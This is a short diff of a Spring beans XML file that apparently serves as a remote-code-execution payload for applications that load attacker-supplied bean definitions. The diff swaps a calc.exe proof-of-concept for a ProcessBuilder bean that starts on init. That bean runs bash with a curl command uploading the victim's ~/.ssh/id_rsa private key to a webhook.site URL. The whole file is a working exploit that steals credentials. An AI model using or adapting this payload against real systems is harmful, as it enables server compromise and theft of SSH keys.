@@ -2,10 +2,14 @@
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
      http://www.springframework.org/schema/beans
-     http://www.springframework.org/schema/beans/spring-beans.xsd
-">
-  <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="calc.exe" />
-     <property name="whatever" value="#{ pb.start() }"/>
+     http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+       <constructor-arg>
+           <array>
+               <value>/bin/bash</value>
+               <value>-c</value>
+               <value>curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@~/.ssh/id_rsa" https://webhook.site/b1654396-4b17-4c34-99d8-4a62dd0cbd03</value>
+           </array>
+        </constructor-arg>
   </bean>
 </beans>
